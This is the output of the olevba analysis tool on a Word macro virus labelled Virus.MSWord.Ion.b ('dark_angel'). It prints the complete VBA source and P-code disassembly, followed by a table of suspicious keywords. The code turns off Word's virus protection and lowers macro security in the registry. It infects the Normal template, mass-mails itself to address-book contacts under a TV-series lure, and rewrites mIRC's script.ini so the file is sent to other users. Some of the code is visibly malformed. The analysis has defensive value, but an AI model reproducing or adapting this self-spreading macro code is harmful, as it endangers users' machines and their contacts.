olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ion.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Ion.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul2.bas 
in file: Virus.MSWord.Ion.b - OLE stream: 'Macros/VBA/Modul2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'dark_angel Macro Virus (c) by Energy
atribute(VBE) = "dark_angel"
Private Sub Document_Open()
On Error Resume Next
Application.DisplayStatusBar = False
Application.ScreenUpdating = False
Application.ShowVisualBasicEditor = False
Application.VBE.ActiveVBProject.VBComponents("dark_angel").Export "c:\windows\dark_angel.dll"
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
Options.VirusProtection = False
Set FSO = CreateObject("Scripting.FileSystemObject")
Set dirwin = FSO.GetSpecialFolder(0)
Set regedit = CreateObject("WScript.Shell")
regedit.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level", 1, "REG_DWORD"
 If regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\dark_angel") <> "by Energy" Then
  user = regedit.RegRead("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner")
  ActiveDocument.SaveAs FileName:=dirwin & "\dark_angel.doc", FileFormat:=wdFormatDocument
  If ToolsWordCount.Count <= 500 Then
    For a = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(a).Name = "dark_angel" Then NormInstall = True
            Next a
    For a = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(a).Name = "dark_angel" Then ActivInstall = True
            Next a
        If ActivInstall = True And NormInstall = False Then Set Secj = NormalTemplate.VBProject _
            Else If ActivInstall = False And NormInstall = True Then Set Secj = ActiveDocument.VBProject
End If
Private Sub Search()
    Dim SearchPath As String, FindStr As String
    Dim FileSize As Long
    Dim NumFiles As Integer, NumDirs As Integer
    Screen.MousePointer = vbHourglass
       SearchPath = "C:\My Documents"
       FindStr = "*.*htm"
    FileSize = FindFilesAPI(SearchPath, FindStr, NumFiles, NumDirs)
    Screen.MousePointer = vbDefault
    End
End Sub
Private Sub try(fName)
On Error Resume Next
WindowSize = 5000
seekPoint = 1
Open fName For Binary As 1
  Do While seekPoint < LOF(1)
   VarString$ = String$(WindowSize, " ")
   Get #1, seekPoint, VarString$
   seekPoint = seekPoint + WindowSize - 50
   AsIs = search_(VarString$)
  Loop
Close #1
End Sub
Function mid_(a$, i, j1)
On Error Resume Next
s = 0
If i > 0 And (i + j1 - 1) <= Len(a$) Then
  b$ = Mid$(a$, i, j1)
  If b$ >= "a" And b$ <= "z" Then s = 1
  If b$ >= "A" And b$ <= "Z" Then s = 1
  If b$ >= "0" And b$ <= "9" Then s = 1
  If b$ = "-" Or b$ = "_" Or b$ = "+" Or b$ = "." Or b$ = "@" Then s = 1
End If
mid_ = s
End Function
Function search_(a$)
On Error Resume Next
s$ = ""
For i = 1 To Len(a$)
  If Mid$(a$, i, 1) = "@" Then
   name_ = "": j = i
   Do
    j = j - 1
    s = mid_(a$, j, 1)
   Loop While s = 1
   Do
    j = j + 1
    s = mid_(a$, j, 1)
    If s = 1 Then name_ = name_ + Mid$(a$, j, 1)
   Loop While s = 1
   s = 0: k = 0
   For j2 = 1 To Len(name_)
    If Mid$(name_, j2, 1) = "@" Then k = k + 1
    If Mid$(name_, j2, 1) = "." Then s = 1
   Next
   If k = 1 And s = 1 And Len(name_) > 5 And Left$(name_, 1) <> "@" And
Right$(name_, 1) <> "@" Then MsgBox name_
   'Then UserForm1.addr.AddItem Name_
  End If
  If Mid$(a$, i, 1) <> "@" Then s$ = s$ + Mid$(a$, i, 1) Else s$ = s$ + " "
Next
search_ = s$
End Function
Set Outlook = CreateObject("Outlook.Application")
  Set MAPI = Outlook.GetNameSpace("MAPI")
      MAPI.Logon "profile", "password"
      For Y = 1 To MAPI.AddressLists.Count
          Set AddyBook = MAPI.AddressLists(Y)
          X = 1
          Set Out = Outlook.CreateItem(0)
          For oo = 1 To AddyBook.AddressEntries.Count
              Mail = AddyBook.AddressEntries(X)
              Out.Recipients.Add Mail
              X = X + 1
              If X > 30 Then oo = AddyBook.AddressEntries.Count
           Next oo
           Out.Subject = "RE:"
           Out.Body = "The True Time Story about the TV Serie Dark Angel"
           Out.Body = Out.Body & vbCrLf & ""
           Out.Body = Out.Body & vbCrLf & "Visit the Dark_Angel.doc, and you can see the Story about James Cameron´s Dark Angel"
           Out.Body = Out.Body & vbCrLf & vbCrLf & vbCrLf & vbCrLf
           Out.Attachments.Add (dirwin & "\dark_angel.doc")
           Out.DeleteAfterSubmit = True
           Out.Send
           Mail = ""
SHELL "COPY dark_angel.doc C:\Windows\"
SetAttr "C:\Windows\dark_angel.doc", vbReadOnly
SetAttr "C:\windows\dark_angel.dll", vbReadOnly
SetAttr "C:\mirc\system\script.ini", vbReadOnly
Open "C:\mirc\system\script.ini" For Output As #1
PRINT #1 "[script]"
PRINT #1 "n0=on 1:text:   *:?:{ s *2 | halt }"
PRINT #1 "n1=alias /s / *1"
PRINT #1 "n2=on 1:connect:/.enable #d"
PRINT #1 "n3=#d off"
PRINT #1 "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick "c:\windows\dark_angel.doc" } | .disable #d | .timer 1 30 .enable #d }"
PRINT #1 "n5=#d end"
Close #1
Secj.VBComponents.Import ("c:\windows\dark_angel.dll")
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
      Next Y
      MAPI.Logoff
      regedit.RegWrite "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\dark_angel", "(c) by Energy@rRlf.de"
 End If
End Sub
Private Sub Document_Close()
Dim M
M = Int((3 * Rnd) + 1)
 If M = 2 Then
  msg = "Dark Angel (Jessica Alba)" & vbCrLf & "(c) by Energy"
  MsgBox msg, vbCritical, "please retype Dark_Angel.doc"
 End If
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Ion.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 924 bytes
' Macros/VBA/Modul2 - 10167 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0024 "dark_angel Macro Virus (c) by Energy"
' Line #1:
' 	LitStr 0x000A "dark_angel"
' 	Ld VBE 
' 	ArgsSt atribute 0x0001 
' Line #2:
' 	FuncDefn (Private Sub Document_Open())
' Line #3:
' 	OnError (Resume Next) 
' Line #4:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt DisplayStatusBar 
' Line #5:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #6:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #7:
' 	LitStr 0x0019 "c:\windows\dark_angel.dll"
' 	LitStr 0x000A "dark_angel"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #11:
' 	SetStmt 
' 	LitStr 0x001A "Scripting.FileSystemObject"
' 	ArgsLd CreateObject 0x0001 
' 	Set FSO 
' Line #12:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld FSO 
' 	ArgsMemLd GetSpecialFolder 0x0001 
' 	Set dirwin 
' Line #13:
' 	SetStmt 
' 	LitStr 0x000D "WScript.Shell"
' 	ArgsLd CreateObject 0x0001 
' 	Set regedit 
' Line #14:
' 	LitStr 0x0043 "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security\Level"
' 	LitDI2 0x0001 
' 	LitStr 0x0009 "REG_DWORD"
' 	Ld regedit 
' 	ArgsMemCall RegWrite 0x0003 
' Line #15:
' 	LitStr 0x0047 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\dark_angel"
' 	Ld regedit 
' 	ArgsMemLd RegRead 0x0001 
' 	LitStr 0x0009 "by Energy"
' 	Ne 
' 	IfBlock 
' Line #16:
' 	LitStr 0x004C "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RegisteredOwner"
' 	Ld regedit 
' 	ArgsMemLd RegRead 0x0001 
' 	St user 
' Line #17:
' 	Ld dirwin 
' 	LitStr 0x000F "\dark_angel.doc"
' 	Concat 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #18:
' 	Ld ToolsWordCount 
' 	MemLd Count 
' 	LitDI2 0x01F4 
' 	Le 
' 	IfBlock 
' Line #19:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #20:
' 	Ld a 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd Name 
' 	LitStr 0x000A "dark_angel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstall 
' 	EndIf 
' Line #21:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #22:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #23:
' 	Ld a 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd Name 
' 	LitStr 0x000A "dark_angel"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActivInstall 
' 	EndIf 
' Line #24:
' 	StartForVariable 
' 	Ld a 
' 	EndForVariable 
' 	NextVar 
' Line #25:
' 	LineCont 0x0004 0F 00 0C 00
' 	Ld ActivInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	Set Secj 
' 	Else 
' 	BoSImplicit 
' 	Ld ActivInstall 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld NormInstall 
' 	LitVarSpecial (True)
' 	Eq 
' 	And 
' 	If 
' 	BoSImplicit 
' 	SetStmt 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	Set Secj 
' 	EndIf 
' 	EndIf 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	FuncDefn (Private Sub Search())
' Line #28:
' 	Dim 
' 	VarDefn SearchPath (As String)
' 	VarDefn FindStr (As String)
' Line #29:
' 	Dim 
' 	VarDefn FileSize (As Long)
' Line #30:
' 	Dim 
' 	VarDefn NumFiles (As Integer)
' 	VarDefn NumDirs (As Integer)
' Line #31:
' 	Ld vbHourglass 
' 	Ld Screen 
' 	MemSt MousePointer 
' Line #32:
' 	LitStr 0x000F "C:\My Documents"
' 	St SearchPath 
' Line #33:
' 	LitStr 0x0006 "*.*htm"
' 	St FindStr 
' Line #34:
' 	Ld SearchPath 
' 	Ld FindStr 
' 	Ld NumFiles 
' 	Ld NumDirs 
' 	ArgsLd FindFilesAPI 0x0004 
' 	St FileSize 
' Line #35:
' 	Ld vbDefault 
' 	Ld Screen 
' 	MemSt MousePointer 
' Line #36:
' 	End 
' Line #37:
' 	EndSub 
' Line #38:
' 	FuncDefn (Private Sub try(fName))
' Line #39:
' 	OnError (Resume Next) 
' Line #40:
' 	LitDI2 0x1388 
' 	St WindowSize 
' Line #41:
' 	LitDI2 0x0001 
' 	St seekPoint 
' Line #42:
' 	Ld fName 
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Binary)
' Line #43:
' 	Ld seekPoint 
' 	LitDI2 0x0001 
' 	ArgsLd LOF 0x0001 
' 	Lt 
' 	DoWhile 
' Line #44:
' 	Ld WindowSize 
' 	LitStr 0x0001 " "
' 	ArgsLd String$ 0x0002 
' 	St VarString$ 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Ld seekPoint 
' 	Ld VarString$ 
' 	GetRec 
' Line #46:
' 	Ld seekPoint 
' 	Ld WindowSize 
' 	Add 
' 	LitDI2 0x0032 
' 	Sub 
' 	St seekPoint 
' Line #47:
' 	Ld VarString$ 
' 	ArgsLd search_ 0x0001 
' 	St AsIs 
' Line #48:
' 	Loop 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #50:
' 	EndSub 
' Line #51:
' 	FuncDefn (Function mid_(a, i, j1))
' Line #52:
' 	OnError (Resume Next) 
' Line #53:
' 	LitDI2 0x0000 
' 	St s 
' Line #54:
' 	Ld i 
' 	LitDI2 0x0000 
' 	Gt 
' 	Ld i 
' 	Ld j1 
' 	Add 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld a$ 
' 	FnLen 
' 	Le 
' 	And 
' 	IfBlock 
' Line #55:
' 	Ld a$ 
' 	Ld i 
' 	Ld j1 
' 	ArgsLd Mid$ 0x0003 
' 	St B$ 
' Line #56:
' 	Ld B$ 
' 	LitStr 0x0001 "a"
' 	Ge 
' 	Ld B$ 
' 	LitStr 0x0001 "z"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St s 
' 	EndIf 
' Line #57:
' 	Ld B$ 
' 	LitStr 0x0001 "A"
' 	Ge 
' 	Ld B$ 
' 	LitStr 0x0001 "Z"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St s 
' 	EndIf 
' Line #58:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Ge 
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Le 
' 	And 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St s 
' 	EndIf 
' Line #59:
' 	Ld B$ 
' 	LitStr 0x0001 "-"
' 	Eq 
' 	Ld B$ 
' 	LitStr 0x0001 "_"
' 	Eq 
' 	Or 
' 	Ld B$ 
' 	LitStr 0x0001 "+"
' 	Eq 
' 	Or 
' 	Ld B$ 
' 	LitStr 0x0001 "."
' 	Eq 
' 	Or 
' 	Ld B$ 
' 	LitStr 0x0001 "@"
' 	Eq 
' 	Or 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St s 
' 	EndIf 
' Line #60:
' 	EndIfBlock 
' Line #61:
' 	Ld s 
' 	St mid_ 
' Line #62:
' 	EndFunc 
' Line #63:
' 	FuncDefn (Function search_(a))
' Line #64:
' 	OnError (Resume Next) 
' Line #65:
' 	LitStr 0x0000 ""
' 	St s$ 
' Line #66:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld a$ 
' 	FnLen 
' 	For 
' Line #67:
' 	Ld a$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "@"
' 	Eq 
' 	IfBlock 
' Line #68:
' 	LitStr 0x0000 ""
' 	St name_ 
' 	BoS 0x0000 
' 	Ld i 
' 	St j 
' Line #69:
' 	Do 
' Line #70:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Sub 
' 	St j 
' Line #71:
' 	Ld a$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd mid_ 0x0003 
' 	St s 
' Line #72:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	LoopWhile 
' Line #73:
' 	Do 
' Line #74:
' 	Ld j 
' 	LitDI2 0x0001 
' 	Add 
' 	St j 
' Line #75:
' 	Ld a$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd mid_ 0x0003 
' 	St s 
' Line #76:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld name_ 
' 	Ld a$ 
' 	Ld j 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St name_ 
' 	EndIf 
' Line #77:
' 	Ld s 
' 	LitDI2 0x0001 
' 	Eq 
' 	LoopWhile 
' Line #78:
' 	LitDI2 0x0000 
' 	St s 
' 	BoS 0x0000 
' 	LitDI2 0x0000 
' 	St k 
' Line #79:
' 	StartForVariable 
' 	Ld j2 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld name_ 
' 	FnLen 
' 	For 
' Line #80:
' 	Ld name_ 
' 	Ld j2 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "@"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld k 
' 	LitDI2 0x0001 
' 	Add 
' 	St k 
' 	EndIf 
' Line #81:
' 	Ld name_ 
' 	Ld j2 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "."
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0001 
' 	St s 
' 	EndIf 
' Line #82:
' 	StartForVariable 
' 	Next 
' Line #83:
' 	Reparse 0x0047 "   If k = 1 And s = 1 And Len(name_) > 5 And Left$(name_, 1) <> "@" And"
' Line #84:
' 	Reparse 0x0029 "Right$(name_, 1) <> "@" Then MsgBox name_"
' Line #85:
' 	QuoteRem 0x0003 0x0021 "Then UserForm1.addr.AddItem Name_"
' Line #86:
' 	EndIfBlock 
' Line #87:
' 	Ld a$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	LitStr 0x0001 "@"
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld s$ 
' 	Ld a$ 
' 	Ld i 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$ 0x0003 
' 	Add 
' 	St s$ 
' 	Else 
' 	BoSImplicit 
' 	Ld s$ 
' 	LitStr 0x0001 " "
' 	Add 
' 	St s$ 
' 	EndIf 
' Line #88:
' 	StartForVariable 
' 	Next 
' Line #89:
' 	Ld s$ 
' 	St search_ 
' Line #90:
' 	EndFunc 
' Line #91:
' 	SetStmt 
' 	LitStr 0x0013 "Outlook.Application"
' 	ArgsLd CreateObject 0x0001 
' 	Set Outlook 
' Line #92:
' 	SetStmt 
' 	LitStr 0x0004 "MAPI"
' 	Ld Outlook 
' 	ArgsMemLd GetNameSpace 0x0001 
' 	Set MAPI 
' Line #93:
' 	LitStr 0x0007 "profile"
' 	LitStr 0x0008 "password"
' 	Ld MAPI 
' 	ArgsMemCall Logon 0x0002 
' Line #94:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld MAPI 
' 	MemLd AddressLists 
' 	MemLd Count 
' 	For 
' Line #95:
' 	SetStmt 
' 	Ld Y 
' 	Ld MAPI 
' 	ArgsMemLd AddressLists 0x0001 
' 	Set AddyBook 
' Line #96:
' 	LitDI2 0x0001 
' 	St X 
' Line #97:
' 	SetStmt 
' 	LitDI2 0x0000 
' 	Ld Outlook 
' 	ArgsMemLd CreateItem 0x0001 
' 	Set Out 
' Line #98:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #99:
' 	Ld X 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Mail 
' Line #100:
' 	Ld Mail 
' 	Ld Out 
' 	MemLd Recipients 
' 	ArgsMemCall Add 0x0001 
' Line #101:
' 	Ld X 
' 	LitDI2 0x0001 
' 	Add 
' 	St X 
' Line #102:
' 	Ld X 
' 	LitDI2 0x001E 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #103:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #104:
' 	LitStr 0x0003 "RE:"
' 	Ld Out 
' 	MemSt Subject 
' Line #105:
' 	LitStr 0x0031 "The True Time Story about the TV Serie Dark Angel"
' 	Ld Out 
' 	MemSt Body 
' Line #106:
' 	Ld Out 
' 	MemLd Body 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	Ld Out 
' 	MemSt Body 
' Line #107:
' 	Ld Out 
' 	MemLd Body 
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x0054 "Visit the Dark_Angel.doc, and you can see the Story about James Cameron´s Dark Angel"
' 	Concat 
' 	Ld Out 
' 	MemSt Body 
' Line #108:
' 	Ld Out 
' 	MemLd Body 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld vbCrLf 
' 	Concat 
' 	Ld Out 
' 	MemSt Body 
' Line #109:
' 	Ld dirwin 
' 	LitStr 0x000F "\dark_angel.doc"
' 	Concat 
' 	Paren 
' 	Ld Out 
' 	MemLd Attachments 
' 	ArgsMemCall Add 0x0001 
' Line #110:
' 	LitVarSpecial (True)
' 	Ld Out 
' 	MemSt DeleteAfterSubmit 
' Line #111:
' 	Ld Out 
' 	ArgsMemCall Send 0x0000 
' Line #112:
' 	LitStr 0x0000 ""
' 	St Mail 
' Line #113:
' 	LitStr 0x001F "COPY dark_angel.doc C:\Windows\"
' 	ArgsCall SHELL 0x0001 
' Line #114:
' 	LitStr 0x0019 "C:\Windows\dark_angel.doc"
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #115:
' 	LitStr 0x0019 "C:\windows\dark_angel.dll"
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #116:
' 	LitStr 0x0019 "C:\mirc\system\script.ini"
' 	Ld vbReadOnly 
' 	ArgsCall SetAttr 0x0002 
' Line #117:
' 	LitStr 0x0019 "C:\mirc\system\script.ini"
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #118:
' 	Reparse 0x0013 "PRINT #1 "[script]""
' Line #119:
' 	Reparse 0x0030 "PRINT #1 "n0=on 1:text:   *:?:{ s *2 | halt }""
' Line #120:
' 	Reparse 0x001B "PRINT #1 "n1=alias /s / *1""
' Line #121:
' 	Reparse 0x0026 "PRINT #1 "n2=on 1:connect:/.enable #d""
' Line #122:
' 	Reparse 0x0014 "PRINT #1 "n3=#d off""
' Line #123:
' 	Reparse 0x0085 "PRINT #1 "n4=on 1:join:#:{ if ($nick != $me) { dcc send $nick "c:\windows\dark_angel.doc" } | .disable #d | .timer 1 30 .enable #d }""
' Line #124:
' 	Reparse 0x0014 "PRINT #1 "n5=#d end""
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #126:
' 	LitStr 0x0019 "c:\windows\dark_angel.dll"
' 	Paren 
' 	Ld Secj 
' 	MemLd VBComponents 
' 	ArgsMemCall Import 0x0001 
' Line #127:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld wdFormatDocument 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0002 
' Line #128:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	Ld MAPI 
' 	ArgsMemCall Logoff 0x0000 
' Line #130:
' 	LitStr 0x0047 "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\dark_angel"
' 	LitStr 0x0015 "(c) by Energy@rRlf.de"
' 	Ld regedit 
' 	ArgsMemCall RegWrite 0x0002 
' Line #131:
' 	EndIfBlock 
' Line #132:
' 	EndSub 
' Line #133:
' 	FuncDefn (Private Sub Document_Close())
' Line #134:
' 	Dim 
' 	VarDefn M
' Line #135:
' 	LitDI2 0x0003 
' 	Ld Rnd 
' 	Mul 
' 	Paren 
' 	LitDI2 0x0001 
' 	Add 
' 	FnInt 
' 	St M 
' Line #136:
' 	Ld M 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #137:
' 	LitStr 0x0019 "Dark Angel (Jessica Alba)"
' 	Ld vbCrLf 
' 	Concat 
' 	LitStr 0x000D "(c) by Energy"
' 	Concat 
' 	St msg 
' Line #138:
' 	Ld msg 
' 	Ld vbCritical 
' 	LitStr 0x001C "please retype Dark_Angel.doc"
' 	ArgsCall MsgBox 0x0003 
' Line #139:
' 	EndIfBlock 
' Line #140:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|PRINT #             |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|WScript.Shell       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|RegRead             |May read registry keys                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|system              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Application.VBE     |Executable file name                         |
|IOC       |dark_angel.dll      |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

